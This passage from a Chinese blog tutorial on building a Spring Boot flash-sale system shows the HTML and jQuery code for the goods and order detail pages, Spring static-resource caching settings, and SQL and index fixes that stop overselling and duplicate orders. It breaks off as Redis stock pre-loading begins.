class="hljs-string">&quot;3&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;goodsPrice&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>秒杀价<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;3&quot;</span>  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;miaoshaPrice&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>库存数量<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;3&quot;</span>  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;stockCount&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doMiaosha</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">$.ajax(&#123;</span><br><span class="javascript">url:<span class="hljs-string">&quot;/miaosha/do_miaosha&quot;</span>,</span><br><span class="javascript">type:<span class="hljs-string">&quot;POST&quot;</span>,</span><br>data:&#123;<br><span class="javascript">goodsId:$(<span class="hljs-string">&quot;#goodsId&quot;</span>).val(),</span><br>&#125;,<br><span class="javascript">success:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">if</span>(data.code == <span class="hljs-number">0</span>)&#123;</span><br><span class="javascript"><span class="hljs-built_in">window</span>.location.href=<span class="hljs-string">&quot;/order_detail.htm?orderId=&quot;</span>+data.data.id;</span><br><span class="javascript">&#125;<span class="hljs-keyword">else</span>&#123;</span><br>layer.msg(data.msg);<br>&#125;<br>&#125;,<br><span class="javascript">error:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">layer.msg(<span class="hljs-string">&quot;客户端请求有误&quot;</span>);</span><br>&#125;<br>&#125;);<br><br>&#125;<br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params">detail</span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">var</span> miaoshaStatus = detail.miaoshaStatus;</span><br><span class="javascript"><span class="hljs-keyword">var</span>  remainSeconds = detail.remainSeconds;</span><br><span class="javascript"><span class="hljs-keyword">var</span> goods = detail.goods;</span><br><span class="javascript"><span class="hljs-keyword">var</span> user = detail.user;</span><br><span class="javascript"><span class="hljs-keyword">if</span>(user)&#123;</span><br><span class="javascript">$(<span class="hljs-string">&quot;#userTip&quot;</span>).hide();</span><br>&#125;<br><span class="javascript">$(<span class="hljs-string">&quot;#goodsName&quot;</span>).text(goods.goodsName);</span><br><span class="javascript">$(<span class="hljs-string">&quot;#goodsImg&quot;</span>).attr(<span class="hljs-string">&quot;src&quot;</span>, goods.goodsImg);</span><br><span class="javascript">$(<span class="hljs-string">&quot;#startTime&quot;</span>).text(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(goods.startDate).format(<span class="hljs-string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>));</span><br><span class="javascript">$(<span class="hljs-string">&quot;#remainSeconds&quot;</span>).val(remainSeconds);</span><br><span class="javascript">$(<span class="hljs-string">&quot;#goodsId&quot;</span>).val(goods.id);</span><br><span class="javascript">$(<span class="hljs-string">&quot;#goodsPrice&quot;</span>).text(goods.goodsPrice);</span><br><span class="javascript">$(<span class="hljs-string">&quot;#miaoshaPrice&quot;</span>).text(goods.miaoshaPrice);</span><br><span class="javascript">$(<span class="hljs-string">&quot;#stockCount&quot;</span>).text(goods.stockCount);</span><br>countDown();<br>&#125;<br><br><span class="javascript">$(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-comment">//countDown();</span></span><br>getDetail();<br>&#125;);<br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getDetail</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">var</span> goodsId = g_getQueryString(<span class="hljs-string">&quot;goodsId&quot;</span>);</span><br><span class="javascript">$.ajax(&#123;</span><br><span class="javascript">url:<span class="hljs-string">&quot;/goods/detail/&quot;</span>+goodsId,</span><br><span class="javascript">type:<span class="hljs-string">&quot;GET&quot;</span>,</span><br><span class="javascript">success:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">if</span>(data.code == <span class="hljs-number">0</span>)&#123;</span><br>render(data.data);<br><span class="javascript">&#125;<span class="hljs-keyword">else</span>&#123;</span><br>layer.msg(data.msg);<br>&#125;<br>&#125;,<br><span class="javascript">error:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">layer.msg(<span class="hljs-string">&quot;客户端请求有误&quot;</span>);</span><br>&#125;<br>&#125;);<br>&#125;<br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">countDown</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">var</span> remainSeconds = $(<span class="hljs-string">&quot;#remainSeconds&quot;</span>).val();</span><br><span class="javascript"><span class="hljs-keyword">var</span> timeout;</span><br><span class="javascript"><span class="hljs-keyword">if</span>(remainSeconds &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//秒杀还没开始，倒计时</span></span><br><span class="javascript">$(<span class="hljs-string">&quot;#buyButton&quot;</span>).attr(<span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">true</span>);</span><br><span class="javascript">   $(<span class="hljs-string">&quot;#miaoshaTip&quot;</span>).html(<span class="hljs-string">&quot;秒杀倒计时：&quot;</span>+remainSeconds+<span class="hljs-string">&quot;秒&quot;</span>);</span><br><span class="javascript">timeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">$(<span class="hljs-string">&quot;#countDown&quot;</span>).text(remainSeconds - <span class="hljs-number">1</span>);</span><br><span class="javascript">$(<span class="hljs-string">&quot;#remainSeconds&quot;</span>).val(remainSeconds - <span class="hljs-number">1</span>);</span><br>countDown();<br>&#125;,1000);<br><span class="javascript">&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(remainSeconds == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//秒杀进行中</span></span><br><span class="javascript">$(<span class="hljs-string">&quot;#buyButton&quot;</span>).attr(<span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">false</span>);</span><br><span class="javascript"><span class="hljs-keyword">if</span>(timeout)&#123;</span><br><span class="javascript"><span class="hljs-built_in">clearTimeout</span>(timeout);</span><br>&#125;<br><span class="javascript">$(<span class="hljs-string">&quot;#miaoshaTip&quot;</span>).html(<span class="hljs-string">&quot;秒杀进行中&quot;</span>);</span><br><span class="javascript">&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//秒杀已经结束</span></span><br><span class="javascript">$(<span class="hljs-string">&quot;#buyButton&quot;</span>).attr(<span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">true</span>);</span><br><span class="javascript">$(<span class="hljs-string">&quot;#miaoshaTip&quot;</span>).html(<span class="hljs-string">&quot;秒杀已经结束&quot;</span>);</span><br>&#125;<br>&#125;<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中使用了获得url路径中参数的方法g_getQueryString()，该方法在commons.js中定义</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 获取url参数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">g_getQueryString</span>(<span class="hljs-params">name</span>) </span>&#123;<br><span class="hljs-keyword">var</span> reg = <span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&quot;(^|&amp;)&quot;</span> + name + <span class="hljs-string">&quot;=([^&amp;]*)(&amp;|$)&quot;</span>);<br><span class="hljs-keyword">var</span> r = <span class="hljs-built_in">window</span>.location.search.substr(<span class="hljs-number">1</span>).match(reg);<br><span class="hljs-keyword">if</span>(r != <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-built_in">unescape</span>(r[<span class="hljs-number">2</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;;<br><span class="hljs-comment">//设定时间格式化函数，使用new Date().format(&quot;yyyyMMddhhmmss&quot;);</span><br><span class="hljs-built_in">Date</span>.prototype.format = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">format</span>) </span>&#123;<br><span class="hljs-keyword">var</span> args = &#123;<br><span class="hljs-string">&quot;M+&quot;</span>: <span class="hljs-built_in">this</span>.getMonth() + <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;d+&quot;</span>: <span class="hljs-built_in">this</span>.getDate(),<br><span class="hljs-string">&quot;h+&quot;</span>: <span class="hljs-built_in">this</span>.getHours(),<br><span class="hljs-string">&quot;m+&quot;</span>: <span class="hljs-built_in">this</span>.getMinutes(),<br><span class="hljs-string">&quot;s+&quot;</span>: <span class="hljs-built_in">this</span>.getSeconds(),<br>&#125;;<br><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/(y+)/</span>.test(format))<br>format = format.replace(<span class="hljs-built_in">RegExp</span>.$1, (<span class="hljs-built_in">this</span>.getFullYear() + <span class="hljs-string">&quot;&quot;</span>).substr(<span class="hljs-number">4</span> - <span class="hljs-built_in">RegExp</span>.$1.length));<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> args) &#123;<br><span class="hljs-keyword">var</span> n = args[i];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&quot;(&quot;</span> + i + <span class="hljs-string">&quot;)&quot;</span>).test(format))<br>format = format.replace(<span class="hljs-built_in">RegExp</span>.$1, <span class="hljs-built_in">RegExp</span>.$1.length == <span class="hljs-number">1</span> ? n : (<span class="hljs-string">&quot;00&quot;</span> + n).substr((<span class="hljs-string">&quot;&quot;</span> + n).length));<br>&#125;<br><span class="hljs-keyword">return</span> format;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里出现了一个问题，更新common.js文件后浏览器缓存仍然使用的原来的common.js文件，网上的解决办法是清除缓存或者在引入js文件时加入版本号，尝试都不行，最后手动更新了项目生成的target文件中的common.js文件。</p><h3 id="5-2-2-订单详情页"><a href="#5-2-2-订单详情页" class="headerlink" title="5.2.2 订单详情页"></a>5.2.2 订单详情页</h3><p>订单详情页的html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;panel panel-default&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;panel-heading&quot;</span>&gt;</span>秒杀订单详情<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;goodslist&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>商品名称<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;3&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;goodsName&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>商品图片<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span>  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;goodsImg&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>订单价格<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;orderPrice&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>下单时间<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;createDate&quot;</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>订单状态<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;orderStatus&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-block&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;payButton&quot;</span>&gt;</span>立即支付<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>收货人<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>XXX  18812341234<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>收货地址<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>北京市昌平区回龙观龙博一区<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params">detail</span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">var</span> goods = detail.goods;</span><br><span class="javascript"><span class="hljs-keyword">var</span> order = detail.order;</span><br><span class="javascript">$(<span class="hljs-string">&quot;#goodsName&quot;</span>).text(goods.goodsName);</span><br><span class="javascript">$(<span class="hljs-string">&quot;#goodsImg&quot;</span>).attr(<span class="hljs-string">&quot;src&quot;</span>, goods.goodsImg);</span><br><span class="javascript">$(<span class="hljs-string">&quot;#orderPrice&quot;</span>).text(order.goodsPrice);</span><br><span class="javascript">$(<span class="hljs-string">&quot;#createDate&quot;</span>).text(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(order.createDate).format(<span class="hljs-string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>));</span><br><span class="javascript"><span class="hljs-keyword">var</span> status = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="javascript"><span class="hljs-keyword">if</span>(order.status == <span class="hljs-number">0</span>)&#123;</span><br><span class="javascript">status = <span class="hljs-string">&quot;未支付&quot;</span></span><br><span class="javascript">&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(order.status == <span class="hljs-number">1</span>)&#123;</span><br><span class="javascript">status = <span class="hljs-string">&quot;待发货&quot;</span>;</span><br>&#125;<br><span class="javascript">$(<span class="hljs-string">&quot;#orderStatus&quot;</span>).text(status);</span><br><br>&#125;<br><br><span class="javascript">$(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br>getOrderDetail();<br>&#125;)<br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getOrderDetail</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">var</span> orderId = g_getQueryString(<span class="hljs-string">&quot;orderId&quot;</span>);</span><br><span class="javascript">$.ajax(&#123;</span><br><span class="javascript">url:<span class="hljs-string">&quot;/order/detail&quot;</span>,</span><br><span class="javascript">type:<span class="hljs-string">&quot;GET&quot;</span>,</span><br>data:&#123;<br>orderId:orderId<br>&#125;,<br><span class="javascript">success:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">if</span>(data.code == <span class="hljs-number">0</span>)&#123;</span><br>render(data.data);<br><span class="javascript">&#125;<span class="hljs-keyword">else</span>&#123;</span><br>layer.msg(data.msg);<br>&#125;<br>&#125;,<br><span class="javascript">error:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">layer.msg(<span class="hljs-string">&quot;客户端请求有误&quot;</span>);</span><br>&#125;<br>&#125;);<br>&#125;<br><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们已经做了静态化，在开发者窗口发现get请求返回状态码的304，说明当前请求获得内容与上次相同，可以直接读取浏览器中的缓存，但这样还是与后端发生了交互，springboot中关于静态资源处理的配置：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment">#static</span><br><span class="hljs-meta">spring.resources.add-mappings</span>=<span class="hljs-string">true</span><br><span class="hljs-meta">spring.resources.cache.period</span>= <span class="hljs-string">3600</span><br><span class="hljs-meta">spring.resources.chain.cache</span>=<span class="hljs-string">true </span><br><span class="hljs-meta">spring.resources.chain.enabled</span>=<span class="hljs-string">true</span><br><span class="hljs-meta">spring.resources.chain.gzipped</span>=<span class="hljs-string">true</span><br><span class="hljs-meta">spring.resources.chain.html-application-cache</span>=<span class="hljs-string">true</span><br><span class="hljs-meta">spring.resources.static-locations</span>=<span class="hljs-string">classpath:/static/</span><br></code></pre></td></tr></table></figure><p>这样get请求直接返回状态码200,不会发生交互。</p><p>解决超卖问题：</p><p>现在秒杀系统中存在超卖的问题。</p><ol><li>reduceStock</li></ol><p>GoodsService减库存reduceStock</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reduceStock</span><span class="hljs-params">(GoodsVo goods)</span> </span>&#123;<br>    MiaoshaGoods g = <span class="hljs-keyword">new</span> MiaoshaGoods();<br>    g.setGoodsId(goods.getId());<br>    goodsDao.reduceStock(g);<br>&#125;<br></code></pre></td></tr></table></figure><p>GoodsDao减库存reduceStock</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Update(&quot;update miaosha_goods set stock_count = stock_count-1 where goods_id = #&#123;goodsId&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">reduceStock</span><span class="hljs-params">(MiaoshaGoods g)</span></span>;<br></code></pre></td></tr></table></figure><p>虽然在MiaoshaController减去库存之前判断了库存&gt;0，这里如果两个用户都走到了reduceStock，我们发现库存会从1减到-1，处理方法是在sql中加上判断防止数据为负数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Update(&quot;update miaosha_goods set stock_count = stock_count-1 where goods_id = #&#123;goodsId&#125; and stock_count &gt; 0&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">reduceStock</span><span class="hljs-params">(MiaoshaGoods g)</span></span>;<br></code></pre></td></tr></table></figure><p>第二个用户秒杀失败减库存失败但是仍然执行了下订单操作，会不会显示成功，因为执行reduceStock虽然库存为0，但语句本身不执行不代表异常，不会抛出异常，所以需要对减库存失败进一步判断。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Transactional</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> OrderInfo <span class="hljs-title">miaosha</span><span class="hljs-params">(MiaoshaUser user, GoodsVo goods)</span> </span>&#123;<br>       <span class="hljs-comment">//减库存</span><br>       <span class="hljs-keyword">boolean</span> success = goodsService.reduceStock(goods);<br>       <span class="hljs-comment">//生成订单</span><br>       <span class="hljs-keyword">if</span> (success)&#123;<br>           <span class="hljs-keyword">return</span> orderService.createOrder(user,goods);<br>       &#125;<span class="hljs-keyword">else</span> &#123;<br>           setGoodsOver(goods.getId());<br>           <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><ol><li>秒杀一个用户只能买一个商品，但是如果同一用户发出了两个请求，两个请求同时到达减库存，会导致同一用户重复购买，解决办法是在miaosha_order表上建立唯一索引u_uid_gid，字段为user_id，goods_id，也就是说不允许出现具有索引值相同的行，也就避免同一用户-商品的重复出现。</li></ol><h2 id="5-3-静态资源优化"><a href="#5-3-静态资源优化" class="headerlink" title="5.3 静态资源优化"></a>5.3 静态资源优化</h2><ol><li>JS/CSS压缩，减少流量，比如使用jquery.min.js</li><li>多个JS/CSS组合，减少连接数</li><li>CDN就近访问</li></ol><h1 id="6-接口优化"><a href="#6-接口优化" class="headerlink" title="6. 接口优化"></a>6. 接口优化</h1><h2 id="6-1-Redis预减库存减少数据库访问"><a href="#6-1-Redis预减库存减少数据库访问" class="headerlink" title="6.1 Redis预减库存减少数据库访问"></a>6.1 Redis预减库存减少数据库访问</h2><p>由于Mysql数据库抗并发能力是瓶颈，进一步优化的方案是减少数据库访问：</p><ol><li>系统初始化，把商品库存数量加载到Redis</li></ol><p>使MiaoshaController实现InitializingBean接口，该接口需要实现afterPropertiesSet()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * 